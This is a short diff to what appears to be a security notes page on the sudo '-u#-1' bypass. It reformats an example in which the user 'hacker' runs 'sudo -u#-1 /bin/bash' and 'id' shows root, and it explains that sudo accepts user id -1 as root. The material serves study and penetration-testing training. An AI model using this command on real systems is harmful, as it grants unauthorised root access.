@@ -62,7 +62,11 @@ With ALL specified, user hacker can run the binary /bin/bash as any user
 
 Example :
 
-#### `hacker@kali:~$ sudo -u#-1 /bin/bash` `root@kali:/home/hacker# id` `uid=0(root) gid=1000(hacker) groups=1000(hacker)` `root@kali:/home/hacker#`
+#### `hacker@kali:~$ sudo -u#-1 /bin/bash` `root@kali:/home/hacker# id`&#x20;
+
+#### `uid=0(root) gid=1000(hacker) groups=1000(hacker)`&#x20;
+
+#### `root@kali:/home/hacker#`
 
 #### <mark style="color:green;">Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv -u#-1 returns as 0 which is root's id and /bin/bash is executed with root permission Proof of Concept Code :</mark>
 
